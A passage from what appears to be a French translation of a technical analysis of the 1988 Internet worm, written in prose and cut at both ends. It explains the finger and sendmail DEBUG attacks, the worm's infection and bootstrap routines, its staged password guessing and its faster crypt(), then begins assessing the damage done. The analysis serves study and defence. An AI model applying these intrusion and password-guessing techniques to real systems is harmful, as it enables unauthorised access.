            la fonction soit apparemment mandat&eacute; par le standard ANSI C 
            &agrave; venir (<a href="#f4" name="rf4">4</a>). Jusque ici personne 
            n'avait pr&eacute;tendu avoir &eacute;t&eacute; victime du bug dans 
            le serveur <i>finger</i> avant l'incident du worm, mais en Mai 1998, 
            des &eacute;tudiants de l'UC Santa Cruz auraient apparemment pass&eacute; 
            des s&eacute;curit&eacute;s en utilisant un serveur <i>finger</i> 
            diff&eacute;rent, mais avec un bug similaire. L'administrateur syst&egrave;me 
            de l'UCSC remarqua que le serveur <i>finger</i> de Berkeley poss&eacute;dait 
            un bug semblable et envoya un mail &agrave; Berkeley, mais la gravit&eacute; 
            du probl&egrave;me n'a pas &eacute;t&eacute; prise &agrave; sa juste 
            valeur &agrave; ce moment l&agrave; (Jim Haynes, private communication).</p>
          <p>Note additionnelle : le ver est m&eacute;ticuleux pour certaines 
            choses mais ne l'est pas pour d'autres. D'apr&egrave;s ce que nous 
            pouvons dire, il n'y avait pas de version de l'intrusion par <i>finger</i> 
            pour Sun-3 bien que le serveur Sun-3 &eacute;tait tout aussi vuln&eacute;rable 
            que celui de VAX. Peut-&ecirc;tre que l'auteur disposait des sources 
            VAX mais pas des sources Sun ?</p>
          <p class="textgras"><a name="p453"></a>4.5.3 Sendmail</p>
        </div>
        <blockquote> 
          <div align="left">[T]he trap door resulted from two distinct 'features' 
            that, although innocent by themselves, were deadly when combined (kind 
            of like binary nerve gas). [Eric Allman, personal communication, 11/22/88]</div>
        </blockquote>
        <div align="left"> 
          <p>L'attaque <i>sendmail</i> est probablement la plus d&eacute;laiss&eacute;e 
            dans l'arsenal du ver, mais cela n'a pas emp&ecirc;ch&eacute; qu'un 
            site en Utah ait &eacute;t&eacute; sujet &agrave; environ 150 attaques 
            <i>sendmail</i> le Jeudi Noir. <i>Sendmail</i> est le programme qui 
            fournit le service mail SMTP sur les r&eacute;seaux TCP pour les syst&egrave;mes 
            Berkeley UNIX. Il utilise un protocole simple en texte pur pour accepter 
            des mails venant de sites distants. Une des caract&eacute;ristiques 
            de <i>sendmail</i> est qu'il permet de distribuer les messages &agrave; 
            des processus plut&ocirc;t qu'aux fichiers de bo&icirc;tes de messageries 
            ; cela peut &ecirc;tre utilis&eacute; par (disons) le programme de 
            vacances qui informe les exp&eacute;diteurs que vous &ecirc;tes en 
            vacances et que vous &ecirc;tes temporairement dans l'incapacit&eacute; 
            de r&eacute;pondre &agrave; leurs messages. Normalement cette fonction 
            n'est disponible que pour les destinataires. Malheureusement, une 
            petite ouverture a accidentellement &eacute;t&eacute; cr&eacute;e 
            quand deux anciennes failles de s&eacute;curit&eacute; ont &eacute;t&eacute; 
            fix&eacute; - si <i>sendmail</i> est compil&eacute; avec l'option 
            <i>DEBUG</i>, et que &agrave; l'ex&eacute;cution l'exp&eacute;diteur 
            demande &agrave; <i>sendmail</i> de passer en mode <i>debug</i> en 
            lui envoyant la commande <i>debug</i>, il accorde &agrave; l'exp&eacute;diteur 
            le droit de passer une s&eacute;quence de commandes &agrave; la place 
            d'un nom d'utilisateur comme destinataire. H&eacute;las, la majorit&eacute; 
            des versions de <i>sendmail</i> sont compil&eacute;es avec <i>DEBUG</i>, 
            entre autres celle que Sun exp&eacute;die dans sa version binaire. 
            Le ver imite une connexion SMTP &agrave; distance, remplissant le 
            champ nom de l'exp&eacute;diteur par <i>/dev/null</i> et en prenant 
            soins de placer une cha&icirc;ne malicieuse comme destinataire. Cette 
            cha&icirc;ne lance une commande qui efface l'en-t&ecirc;te du message 
            et passe le corps &agrave; un interpr&eacute;teur de commande. Le 
            corps contient une copie de la source de la routine de d&eacute;marrage 
            du ver ainsi que les commandes n&eacute;cessaires &agrave; sa compilation 
            et &agrave; son ex&eacute;cution. Une fois que le ver en a fini avec 
            le protocole et a ferm&eacute; la connexion avec <i>sendmail</i>, 
            le code de d&eacute;marrage sera fabriqu&eacute; sur l'h&ocirc;te 
            distant et le ver local attend sa connexion afin qu'il puisse compl&eacute;ter 
            le processus de fabrication du nouveau ver.</p>
          <p>Bien s&ucirc;r ce n'est pas la premi&egrave;re fois qu'une inadvertante 
            br&egrave;che ou &quot;trappe&quot; comme celle-l&agrave; est trouv&eacute;e 
            dans <i>sendmail</i>, et ce ne sera probablement pas la derni&egrave;re. 
            Dans sa conf&eacute;rence &quot;Turing Award&quot;, Ken Thompson a 
            dit : &quot;Vous ne pouvez faire confiance &agrave; du code que vous 
            n'avez pas totalement cr&eacute;e vous-m&ecirc;me (Sp&eacute;cialement 
            le code d'entreprises qui emploient des personnes comme moi.)&quot; 
            En fait, comme l'a dit Eric Allman, &quot;[V]ous ne pouvez m&ecirc;me 
            pas faire confiance &agrave; du code que vous avez enti&egrave;rement 
            cr&eacute;&eacute; vous m&ecirc;me.&quot; Le probl&egrave;me basique 
            de la confiance envers les programmes syst&egrave;mes n'est pas pr&egrave;s 
            de se r&eacute;soudre.</p>
          <p class="texttitre2"><a name="p46"></a>4.6 Infection</p>
          <p>Le ver utilise deux routines favorites quand il d&eacute;cide qu'il 
            veut infecter une machine. Une routine que nous avons baptis&eacute; 
            <i>infect()</i> est utilis&eacute;e &agrave; partir de fonctions de 
            recherche d'h&ocirc;tes comme <i>hg()</i>. <i>infect()</i> commence 
            par v&eacute;rifier qu'il n'est pas en train d'infecter la machine 
            locale, une machine d&eacute;j&agrave; infect&eacute;e ou une machine 
            pr&eacute;c&eacute;demment attaqu&eacute;e mais qu'il n'avait pas 
            &eacute;t&eacute; incapable de p&eacute;n&eacute;trer ; les &eacute;tats 
            &quot;infect&eacute;&quot; et &quot;immunis&eacute;&quot; sont signal&eacute;s 
            par des drapeaux sur la structure d'une machine quand l'attaque a 
            respectivement r&eacute;ussie ou &eacute;chou&eacute;e. Le ver s'assure 
            ensuite qu'il peut obtenir une adresse pour sa cible, la marquant 
            comme &eacute;tant immunis&eacute;e si il n'y parvient pas. Vient 
            alors une s&eacute;rie d'attaques : d'abord par <i>rsh</i> &agrave; 
            partir du compte qui fait fonctionner le ver, puis par <i>finger</i>, 
            et enfin par <i>sendmail</i>. Si <i>infect()</i> &eacute;choue, il 
            marque la machine comme &eacute;tant immunis&eacute;e.</p>
          <p>L'autre routine d'infection se nomme <i>hul()</i> et elle est appel&eacute;e 
            &agrave; partir du code de cassage de mots de passe, une fois qu'un 
            mot de passe a &eacute;t&eacute; trouv&eacute;. <i>hul()</i>, comme 
            <i>infect()</i>, s'assure qu'elle ne r&eacute;infecte pas une machine, 
            puis v&eacute;rifie une adresse. Si un &eacute;ventuel nom d'utilisateur 
            distant est trouv&eacute; dans les fichiers <i>.forward</i> et <i>.rhosts</i>, 
            le ver v&eacute;rifie qu'il est valide - il ne doit pas contenir de 
            caract&egrave;res de ponctuation ou de caract&egrave;res de contr&ocirc;le. 
            Si un nom d'utilisateur distant est indisponible le ver se sert du 
            nom d'utilisateur local. Une fois que le ver poss&egrave;de un nom 
            d'utilisateur et un password, il contacte le serveur <i> rexec</i> 
            de sa cible et essaie de s'authentifier. S'il y parvient, il proc&egrave;de 
            &agrave; la phase de d&eacute;marrage ; dans le cas contraire, il 
            tente une approche l&eacute;g&egrave;rement diff&eacute;rente - il 
            se connecte au serveur <i>rexec</i> local avec le nom d'utilisateur 
            local et son mot de passe, puis il utilise cet interpr&eacute;teur 
            de commande pour r&eacute;cup&eacute;rer un shell chez sa victime 
            avec <i>rsh</i>. Cela fonctionnera si la cible consid&egrave;re l'h&ocirc;te 
            local comme &eacute;tant de confiance (dans son fichier <i>/etc/hosts.equiv</i>), 
            ou qu'elle consid&egrave;re le compte local comme &eacute;tant s&ucirc;r 
            (marqu&eacute; dans son fichier <i>.rhosts</i>). La fonction <i>hul()</i> 
            ne prend pas en compte le drapeau d'immunit&eacute; de <i>infect()</i> 
            et ne fixe pas ce drapeau elle-m&ecirc;me, cela s'explique par le 
            fait que <i>hul()</i> peut r&eacute;ussir l&agrave; ou <i>infect()</i> 
            &eacute;choue (l'une fait une recherche sur les comptes d'utilisateurs, 
            l'autre sur les machines).</p>
          <p><i>infect()</i> et <i>hul()</i> font toutes les deux appel &agrave; 
            une routine, que nous avons appel&eacute; <i>sendworm()</i>, pour 
            faire leur sale boulot (<a href="#f5" name="rf5">5</a>). <i>sendworm()</i> 
            recherche le fichier source de d&eacute;marrage <i>l1.c</i> dans sa 
            liste d'objets, puis elle utilise la routine <i>makemagic()</i> afin 
            de r&eacute;cup&eacute;rer un canal de communication (un socket), 
            un num&eacute;ro de port r&eacute;seau al&eacute;atoire, ainsi qu'un 
            num&eacute;ro magique pour l'authentification. (<i>makemagic()</i> 
            poss&egrave;de un effet secondaire int&eacute;ressant - il recherche 
            l'adresse d'une machine en essayant de se connecter &agrave; son port 
            TCP <i>telnet</i>, cela produit un message de log particulier de la 
            part du serveur <i>telnet</i>.) Si <i>makemagic()</i> s'est r&eacute;alis&eacute; 
            correctement, le ver commence &agrave; envoyer des commandes &agrave; 
            l'interpr&eacute;teur de commandes distant qui a &eacute;t&eacute; 
            lanc&eacute; lors de l'attaque effectu&eacute;e juste avant. Il change 
            de r&eacute;pertoire pour un endroit non-prot&eacute;g&eacute; (<i>/usr/tmp</i>), 
            et y met la source d'amor&ccedil;age, faisant appel &agrave; l'&eacute;diteur 
            de flux UNIX <i>sed</i> pour copier le flux entrant. La source d'amor&ccedil;age 
            est compil&eacute;e puis lanc&eacute;e sur le syst&egrave;me distant, 
            ensuite le ver lance une routine nomm&eacute;e <i>waithit()</i> qui 
            attend que la routine de d&eacute;marrage distante le contacte sur 
            le port choisi.</p>
          <p>L'amor&ccedil;age est vraiment simple. On lui passe l'adresse de 
            la machine d'origine, un num&eacute;ro de port TCP ainsi qu'un nombre 
            magique en arguments. Au d&eacute;marrage, le code d'amor&ccedil;age 
            s'efface lui m&ecirc;me de fa&ccedil;on &agrave; ne pas &ecirc;tre 
            d&eacute;tect&eacute; dans le syst&egrave;me de fichier, puis il appelle 
            <i>fork()</i> pour cr&eacute;er un nouveau processus. L'ancien processus 
            subsiste, permettant au ver d'origine de continuer son travail. Le 
            code d'amor&ccedil;age r&eacute;cup&egrave;re ses arguments puis les 
            mets &agrave; z&eacute;ro pour les cacher du programme de statut syst&egrave;me 
            ; il est alors pr&ecirc;t &agrave; se connecter sur le r&eacute;seau 
            &agrave; son ver p&egrave;re. Quand la connexion est &eacute;tablie, 
            la routine y fait passer le nombre magique, que le p&egrave;re va 
            comparer avec sa propre copie. Si le p&egrave;re valide ce nombre, 
            il envoie ensuite une s&eacute;rie de noms de fichiers et de fichiers 
            que le code d'amor&ccedil;age &eacute;crit sur le disque. Si un probl&egrave;me 
            survient, le code efface tous ces fichiers et quitte. Finalement la 
            transaction se termine, et la routine d'amor&ccedil;age fait appel 
            &agrave; un shell pour terminer le travail.</p>
          <p>Pendant ce temps, la fonction <i>waithit()</i> du p&egrave;re attend 
            jusqu'&agrave; deux minutes que la routine d'amor&ccedil;age la contacte 
            ; si l'amor&ccedil;age ne parvient pas &agrave; rappeler, ou si l'authentification 
            &eacute;choue, le worm d&eacute;cide d'abandonner et signale un &eacute;chec. 
            Si une connexion est &eacute;tablie, le worm exp&eacute;die tous ses 
            fichiers suivis par un indicateur de fin de fichier (eof). Il se met 
            en pause quatre secondes, histoire qu'un shell distant soit lanc&eacute;, 
            puis il donne les commandes pour cr&eacute;er un nouveau ver. Pour 
            chaque fichier pr&eacute;sent dans sa liste, le ver tente de cr&eacute;er 
            un objet ex&eacute;cutable, typiquement chaque fichier contient du 
            code pour un type d'ordinateur particulier, et cette cr&eacute;ation 
            &eacute;chouera jusqu'&agrave; ce que le ver trouve le bon type d'ordinateur. 
            Si le ver p&egrave;re parvient finalement &agrave; g&eacute;n&eacute;rer 
            un ver fils ex&eacute;cutable, il le fait se d&eacute;tacher avec 
            l'option -<b>p</b> pour tuer le shell, puis ferme la connexion. La 
            machine cible est marqu&eacute;e comme &eacute;tant &quot;infect&eacute;e&quot;. 
            Si aucun des objets n'a produit un ver fils utilisable, le p&egrave;re 
            efface les d&eacute;chets et <i>waithit()</i> retourne un code d'erreur.</p>
          <p>Quand un syst&egrave;me se fait submerger par les vers, le r&eacute;pertoire 
            <i>/usr/tmp</i> peut se remplir avec les restes de fichiers comme 
            cons&eacute;quence &agrave; un bug dans <i>waithit()</i>. Si la compilation 
            d'un ver prend plus de 30 secondes, le code de re-synchronisation 
            signalera une erreur mais <i>waithit()</i> ne parviendra pas &agrave; 
            effacer les fichiers qui ont &eacute;t&eacute; cr&eacute;&eacute;s. 
            Sur l'une de nos machines, 13 Mo de donn&eacute;es repr&eacute;sentant 
            un ensemble de 86 fichiers se sont accumul&eacute;s en 5.5 heures.</p>
          <p class="texttitre2"><a name="p47"></a>4.7 Cassage de mot de passe</p>
          <p>Un algorithme de cassage de password para&icirc;t &ecirc;tre une 
            fonctionnalit&eacute; lente et encombrante &agrave; placer dans un 
            worm, mais celui ci rend cette tache persistante et efficace. Le ver 
            est aid&eacute; par des statistiques regrettables con&ccedil;ernant 
            les choix typiques de mots de passe. Dans cette partie nous &eacute;tudierons 
            comment le ver choisi des passwords &agrave; tester et comment la 
            routine d'encryption de password UNIX a &eacute;t&eacute; modifi&eacute;e.</p>
          <p class="textgras"><a name="p471"></a>4.7.1 Deviner les mots de passe</p>
        </div>
        <blockquote> 
          <div align="left">For example, if the login name is &quot;abc&quot;, 
            then &quot;abc&quot;, &quot;cba&quot;, and &quot;abcabc&quot; are 
            excellent candidates for passwords. [Grampp and Morris, &quot;UNIX 
            Operating System Security&quot;]</div>
        </blockquote>
        <div align="left"> 
          <p>La divination des mots de passe par le ver se fait en quatre &eacute;tapes. 
            La premi&egrave;re &eacute;tape rassemble des informations sur les 
            mots de passe, alors que les &eacute;tapes restantes repr&eacute;sentent 
            de moins en moins des sources de passwords potentielles. La routine 
            centrale de cracking est appel&eacute;e <i>cracksome()</i>, et elle 
            contient un switch (aiguillage) sur chacune de ces quatre &eacute;tapes.</p>
          <p>La routine qui impl&eacute;mente la premi&egrave;re &eacute;tape 
            a &eacute;t&eacute; baptis&eacute;e <i>crack_0()</i>. Le r&ocirc;le 
            de cette routine est de collecter des informations sur les machines 
            et les comptes. Elle est lanc&eacute;e une seule fois ; l'information 
            r&eacute;cup&eacute;r&eacute;e persiste toute la dur&eacute;e de vie 
            du worm. Son impl&eacute;mentation est simple et sans d&eacute;tours 
            : elle lit les fichiers <i>/etc/hosts.equiv</i> et <i>/.rhosts</i> 
            pour les machines &agrave; attaquer, puis lit le fichier password 
            &agrave; la recherche de comptes d'utilisateurs. Pour chaque compte, 
            le ver garde en m&eacute;moire le nom, le mot de passe crypt&eacute;, 
            le r&eacute;pertoire personnel (le home) ainsi que le champ d'information 
            sur l'utilisateur. Comme premi&egrave;re v&eacute;rification rapide, 
            il regarde les fichiers <i>.forward</i> dans le r&eacute;pertoire 
            home de chaque utilisateur et m&eacute;morise tous les noms de machines 
            qu'il y trouve, les marquant de la m&ecirc;me fa&ccedil;on que les 
            pr&eacute;c&eacute;dentes.</p>
          <p>Nous n'avons pas fait preuve d'originalit&eacute; en nommant la fonction 
            de l'&eacute;tat suivant <i>crack_1()</i>. <i>crack_1()</i> cherche 
            tous les mots de passe qui peuvent &ecirc;tre cass&eacute;s de fa&ccedil;on 
            triviale. Il s'agit des mots de passe qui peuvent &ecirc;tre devin&eacute;s 
            simplement &agrave; partir des informations pr&eacute;sentes dans 
            le fichier password. Grampp et Morris ont effectu&eacute; une &eacute;tude 
            sur plus de 100 fichiers password qui montre que entre 8 et 30 pourcents 
            des mots de passe sont litt&eacute;ralement les m&ecirc;me que le 
            nom de l'utilisateur ou avec de petites variations. Les essais du 
            ver sont un peu plus durs que cela : il teste le mot de passe vide, 
            le nom de compte, le nom de compte r&eacute;p&eacute;t&eacute; (concat&eacute;n&eacute; 
            &agrave; lui-m&ecirc;me), le pr&eacute;nom (extrait du champ d'information 
            concernant l'utilisateur, avec la premi&egrave;re lettre mise en minuscule), 
            le nom de famille ainsi que le nom de compte retourn&eacute;. Il traite 
            jusqu'&agrave; 50 comptes par appel &agrave; <i>cracksome()</i>, m&eacute;morisant 
            sa place dans la liste de comptes et passant &agrave; l'&eacute;tape 
            suivante lorsqu'il est &agrave; court de comptes &agrave; tester.</p>
          <p>L'&eacute;tape suivante est g&eacute;r&eacute;e par <i>crack_2()</i>. 
            Dans cette &eacute;tape le ver compare une liste de mots de passe 
            favoris, un password par appel, avec tous les mots de passe crypt&eacute;s 
            qui &eacute;taient pr&eacute;sents dans le fichier password. Cette 
            liste contient 432 mots, la plupart sont des mots tir&eacute;s du 
            dictionnaire anglais ou des noms propres ; il est fort probable que 
            cette liste soit g&eacute;n&eacute;r&eacute;e &agrave; partir de fichiers 
            de mots de passe d&eacute;rob&eacute;s puis cass&eacute;s par l'auteur, 
            sur son temps libre et sur sa machine personnelle. La variable globale 
            <i>nextw</i> est utilis&eacute;e pour compter le nombre de mots de 
            passe test&eacute;s, et c'est ce compteur (en plus de la perte au 
            jeux de contr&ocirc;le de la population) qui d&eacute;cide si le ver 
            quitte &agrave; la fin de la boucle principale - <i>nextw</i> doit 
            &ecirc;tre sup&eacute;rieure &agrave; 10 afin que le ver puisse se 
            terminer. Puisque le ver passe normalement 2,5 minutes &agrave; chercher 
            des clients durant l'ex&eacute;cution de la boucle principale et fait 
            appel &agrave; <i>cracksome()</i> deux fois lors de cette p&eacute;riode, 
            il semblerait que le ver doit faire au minimum 7 passages dans la 
            boucle principale, ce qui lui prend plus de 15 minutes au total (<a href="#f6" name="rf6">6</a>). 
            Il faudra 9 heures au ver pour scanner sa propre liste de mots de 
            passe et proc&eacute;der &agrave; l'&eacute;tape suivante.</p>
          <p>La derni&egrave;re &eacute;tape est conduite par <i>crack_3()</i>. 
            Cette fonction ouvre le dictionnaire pr&eacute;sent sur les syst&egrave;mes 
            UNIX, se trouvant &agrave; <i>/usr/dict/words</i>, et lit chaque mot 
            l'un apr&egrave;s l'autre. Si un mot est en lettres capitales, le 
            ver teste aussi une version en minuscules. Cette recherche peut durer 
            une &eacute;ternit&eacute; : cela prendrait environ quatre semaines 
            au ver de traiter un dictionnaire comme le notre.</p>
          <p>Quand le ver s&eacute;lectionne un mot de passe potentiel, il le 
            passe &agrave; la routine que nous avons nomm&eacute; <i>try_password()</i>. 
            Cette fonction fait appel &agrave; la version du ver de la fonction 
            d'encryption de password UNIX <i>crypt()</i> et compare le r&eacute;sultat 
            avec le mot de passe crypt&eacute; de la cible actuelle (le compte 
            trait&eacute; &agrave; ce moment). Si les r&eacute;sultats concordent, 
            ou si le ver a d&eacute;couvert que le password &eacute;tait une cha&icirc;ne 
            vide (pas de password), le ver sauvegarde le mot de passe en clair 
            et attaque les machines poss&eacute;dant ce compte. Une routine que 
            nous avons baptis&eacute; <i>try_forward_and_rhosts()</i> lit les 
            fichiers <i>.forward</i> et <i>.rhosts</i> des utilisateurs, appelant 
            la fonction <i>hul()</i> d&eacute;crite pr&eacute;c&eacute;demment 
            pour chaque compte trouv&eacute;.</p>
          <p class="textgras"><a name="p472"></a>4.7.2 Cryptage plus rapide des 
            mots de passe</p>
        </div>
        <blockquote> 
          <div align="left">The use of encrypted passwords appears reasonably 
            secure in the absence of serious attention of experts in the field. 
            [Morris and Thompson, &quot;Password Security : A Case History&quot;]</div>
        </blockquote>
        <div align="left"> 
          <p>Il y a malheureusement des experts en cryptographie qui ont apport&eacute; 
            une attention toute particuli&egrave;re &agrave; des impl&eacute;mentations 
            rapides de l'algorithme d'encryption d'UNIX. Le syst&egrave;me d'authentification 
            par password d'UNIX fonctionne sans garder un seul mot de passe dans 
            sa version lisible (en clair) sur le syst&egrave;me, et fonctionne 
            m&ecirc;me sans emp&ecirc;cher les utilisateurs de lire les mots de 
            passe crypt&eacute;s pr&eacute;sents sur le syst&egrave;me. Quand 
            un utilisateur tape son mot de passe en clair, le syst&egrave;me l'encrypte 
            en utilisant la routine standard de la librairie, <i>crypt()</i>, 
            puis compare le r&eacute;sultat avec la sauvegarde du password crypt&eacute;. 
            L'algorithme d'encryption a &eacute;t&eacute; fait de telle fa&ccedil;on 
            qu'il soit impossible &agrave; inverser, emp&ecirc;chant alors de 
            retrouver un password en analysant juste la version chiffr&eacute;e, 
            et il est aussi long &agrave; faire marcher, si bien que les tests 
            de mots de passe prendront beaucoup de temps. L'algorithme d'encryption 
            des passwords UNIX est bas&eacute; sur le Standard d'Encryption de 
            Donn&eacute;es F&eacute;d&eacute;ral (DES = Data Encrytion Standard). 
            Pour le moment personne ne sait comment inverser l'algorithme en un 
            laps de temps raisonnable, et alors que des puces d'encodage rapide 
            en DES sont disponibles, la version UNIX de l'algorithme est l&eacute;g&egrave;rement 
            modifi&eacute;e de sorte qu'il est impossible d'utiliser une puce 
            de DES standard pour l'impl&eacute;menter.</p>
          <p>Deux probl&egrave;mes relatifs &agrave; l'impl&eacute;mentation UNIX 
            du DES se sont att&eacute;nu&eacute;s. La vitesse des ordinateurs 
            augmente continuellement - les machines actuelles sont g&eacute;n&eacute;ralement 
            plusieurs fois plus rapides que les machines qui &eacute;taient &agrave; 
            disposition quand le syst&egrave;me de password actuel fut invent&eacute;. 
            A cot&eacute; de &ccedil;a, des m&eacute;thodes ont &eacute;t&eacute; 
            d&eacute;couvertes au niveau logiciel permettant d'acc&eacute;l&eacute;rer 
            le DES. Les mots de passe UNIX sont maintenant bien plus vuln&eacute;rables 
            &agrave; une recherche continuelle (attaque exhaustive ou dite de 
            force brute), particuli&egrave;rement si les mots de passes crypt&eacute;s 
            sont d&eacute;j&agrave; connus. La version de la routine UNIX <i>crypt()</i> 
            du ver s'ex&eacute;cute plus de neuf fois plus rapidement que la version 
            standard lorsque nous avons effectu&eacute; les tests sur notre VAX 
            8600. Alors qu'il faut 54 secondes &agrave; la version standard de 
            <i>crypt()</i> pour encrypter 271 passwords sur notre 8600 (le nombre 
            de mots de passe actuellement pr&eacute;sents dans notre fichier password), 
            la version du worm met elle, moins de 6 secondes.</p>
          <p>L'algorithme <i>crypt()</i> du ver semble se baser sur un compromis 
            entre le temps et la m&eacute;moire : le temps n&eacute;cessaire &agrave; 
            l'encryption d'un mot de passe contre l'important espace des tables 
            suppl&eacute;mentaires n&eacute;cessaires pour extraire des performances 
            de l'algorithme. Curieusement, une am&eacute;lioration de l'ex&eacute;cution 
            est en fait d'&eacute;conomiser un peu de m&eacute;moire. L'algorithme 
            traditionnel d'UNIX stocke chaque bit du password dans un octet, alors 
            que l'algorithme du ver entasse les bits dans deux mots de 32 bits. 
            Cela permet &agrave; l'algorithme du ver d'utiliser les champs de 
            bits et les op&eacute;rations de d&eacute;calage (shift) sur les donn&eacute;es 
            du mot de passe, ce qui est bien plus rapide. Parmis les autres acc&eacute;l&eacute;rations, 
            on trouve les boucles d&eacute;roulantes, les tables de combinaisons, 
            des masques et des d&eacute;calages pr&eacute;calcul&eacute;s, ainsi 
            que les permutations initiales et finales toutes les 25 ex&eacute;cutions 
            du DES modifi&eacute; que l'algorithme d'encryption des mots de passe 
            utilise. L'am&eacute;lioration la plus importante est le r&eacute;sultat 
            des permutations de combinaisons : le ver se sert de tableaux &eacute;tendus 
            qui sont index&eacute;s par groupe de bits plut&ocirc;t que par un 
            seul bit comme dans l'algorithme standard. La version rapide de <i>crypt()</i> 
            r&eacute;alis&eacute;e par Matt Bishop fait tout cela et pr&eacute;calcule 
            m&ecirc;me plus de fonctions, la rendant deux fois plus rapide que 
            celle du ver mais n&eacute;cessitant environ 200 Ko de donn&eacute;es 
            initialis&eacute;es contre les 6 Ko utilis&eacute;es par le ver ou 
            les 2 Ko utilis&eacute;es par le <i>crypt()</i> normal.</p>
          <p>Comment les administrateurs syst&egrave;mes peuvent-ils faire face 
            &agrave; ces impl&eacute;mentations rapides de <i>crypt()</i> ? Une 
            des suggestions qui a &eacute;t&eacute; pr&eacute;sent&eacute;e pour 
            tromper les m&eacute;chants est l'id&eacute;e de fichier password 
            'shadow'. Dans ce syst&egrave;me, les mots de passe crypt&eacute;s 
            sont cach&eacute;s plut&ocirc;t que public, obligeant le cracker &agrave; 
            casser un compt&eacute; privil&eacute;gi&eacute; ou utiliser l'unit&eacute; 
            centrale de la machine et son algorithme d'encryption (lent) pour 
            attaquer, avec le danger suppl&eacute;mentaire qu'un test sur un mot 
            de passe soit log&eacute; et l'attaque d&eacute;couverte. L'inconv&eacute;nient 
            des fichiers shadow est le fait que si un m&eacute;chant contourne, 
            d'une fa&ccedil;on ou d'une autre, les protections de ce fichier qui 
            contient les mots de passe actuels, tous les mots de passe doivent 
            &ecirc;tre consid&eacute;r&eacute;s comme cass&eacute;s et devront 
            &ecirc;tre remplac&eacute;s. Une autre proposition qui a &eacute;t&eacute; 
            faite est de remplacer l'impl&eacute;mentation UNIX du DES par l'impl&eacute;mentation 
            la plus rapide disponible, mais l'appeler 1000 fois ou plus &agrave; 
            la place des 25 fois utilis&eacute;es dans le code UNIX de <i>crypt()</i>. 
            A moins que le nombre de tours de boucle se stabilise d'une fa&ccedil;on 
            o&ugrave; d'une autre &agrave; la vitesse maximum offerte par le CPU, 
            cette m&eacute;thode ne fait que repousser l'heure fatidique jusqu'&agrave; 
            ce que le cracker trouve une machine plus performante. Il est int&eacute;ressant 
            de noter que Morris et Thompson ont mesur&eacute; le temps de mise 
            en &#156;uvre de l'ancien algorithme d'encryption m-209 (non-DES) 
            des mots de passe utilis&eacute; dans les versions pr&eacute;c&eacute;dentes 
            de UNIX sur le PDP-11/70 et ont observ&eacute; qu'une bonne impl&eacute;mentation 
            prenait seulement 1,25 millisecondes par encryption, ce qu'ils ont 
            jug&eacute; insuffisant ; actuellement un VAX 800 utilisant l'algorithme 
            DES de Matt Bishop requiert 11,5 millisecondes par encryption, et 
            des machines 10 fois plus rapides que le VAX 8600 et &agrave; un prix 
            plus attractif devrait &ecirc;tre bient&ocirc;t disponibles (si elles 
            ne le sont pas d&eacute;j&agrave; !).</p>
          <p class="texttitre"><a name="p5"></a>5. Opinions</p>
        </div>
        <blockquote> 
          <div align="left"> 
            <p>The act of breaking into a computer system has to have the same 
              social stigma as breaking into a neighbor's house. It should not 
              matter that neighbor's door is unlocked. [Ken Thompson, 1983 Turing 
              Award Lecture]</p>
            <p>[Creators of viruses are] stealing a car for the purpose of the 
              joyriding. [R.H. Morris, in 1983 Capitol Hill testimony, cited in 
              the New York Times 11/11/88]</p>
          </div>
        </blockquote>
        <div align="left"> 
          <p>Je ne compte pas donner de points de vue d&eacute;finitifs sur la 
            moralit&eacute; de l'auteur du ver, l'&eacute;thique relative &agrave; 
            la publication d'informations de s&eacute;curit&eacute; (full-disclosure 
            ou non) ou les besoins de la communaut&eacute; informatique en mati&egrave;re 
            de s&eacute;curit&eacute;, puisque des personnes plus (ou moins) qualifi&eacute;es 
            que moi sont constamment en train de troller sur ces sujets dans les 
            diff&eacute;rents newsgroups et les mailing-lists. Par respect envers 
            le mythique administrateur syst&egrave;me lambda qui a d&ucirc; &ecirc;tre 
            perdu au milieu de toute ces informations et d&eacute;sinformations, 
            je vais tenter de r&eacute;pondre de r&eacute;pondre &agrave; quelques 
            une des questions les plus importantes de fa&ccedil;on circonscrite 
            mais utile.</p>
          <p><i>Le ver a t-il caus&eacute; des d&eacute;g&acirc;ts ?</i> Le ver 
            n'a pas d&eacute;truit de fichiers, na pas intercept&eacute; de courriels 
            priv&eacute;s, n'a pas corrompu de bases de donn&eacute;es ni install&eacute; 
            de chevaux de Troie. En revanche il faisait la concurrence au niveau 
            du temps d'utilisation du CPU avec les processus normaux de l'utilisateur, 
            et en fin de compte les &eacute;crasait. Il &eacute;puisait les ressources 
            syst&egrave;me limit&eacute;es tels que la table des fichiers ouverts 
            ou la table des processus, faisant ainsi &eacute;chouer les processus 
            par manque de ressources. Il amenait certaines machines &agrave; crasher 
            en les faisant fonctionner &agrave; la limite de leurs capacit&eacute;s, 
            provoquant des bugs qui ne seraient pas apparus dans des conditions 
            normales. Il obligea des administrateurs &agrave; red&eacute;marrer 
            une ou plusieurs fois leurs machines pour effacer les vers du syst&egrave;me, 
            mettre fin aux sessions des utilisateurs et aux jobs qui tournaient 
            depuis longtemps. Il for&ccedil;a des administrateurs &agrave; &eacute;teindre 
            leurs passerelles r&eacute;seau, incluant les passerelles entre d'importants 
            r&eacute;seaux de recherche nationaux, qui faisaient leur possible 
            pour isoler le ver ; cela g&eacute;n&eacute;rait des d&eacute;lais 
            allant jusqu'&agrave; plusieurs jours dans le cas d'&eacute;change 
            de courrier &eacute;lectronique, obligeant certains projets &agrave; 
            repousser leurs dates limites et faisant perdre &agrave; d'autres 
            du pr&eacute;cieux temps de travail. Il for&ccedil;a le personnel 
            technique de tout le pays &agrave; annuler leurs importantes recherches 
            et travailler 24 heures par jour &agrave; essayer de contr&ocirc;ler 
            et &eacute;radiquer les vers. Dans au moins une institution, la direction 
            eu tellement peur qu'elle effa&ccedil;a tous les disques de leur installation 
            qui &eacute;taient en ligne au moment de l'infection, et restreigna 
            le rechargement des fichiers aux donn&eacute;es pour lesquelles elle 
            &eacute;tait s&ucirc;re qu'elles n'avaient pas &eacute;t&eacute; modifi&eacute;es 
            par un &eacute;l&eacute;ment &eacute;tranger. Une des cons&eacute;quences 
            fut la d&eacute;gradation de la bande passante &agrave; travers les 
            passerelles qui continuaient de faire fonctionner le ver apr&egrave;s 
            infection et qui utilisaient la majorit&eacute; de leurs capacit&eacute;s 
            &agrave; le transf&eacute;rer d'un r&eacute;seau &agrave; l'autre. 
            Le ver p&eacute;n&eacute;tra des comptes d'utilisateurs, les faisant 
            ainsi passer comme dangereux pour le syst&egrave;me alors qu'en fait 
            ils n'&eacute;taient pas responsables. Il est vrai que le ver aurait 
            pu &ecirc;tre bien plus dangereux qu'il ne l'a &eacute;t&eacute; : 
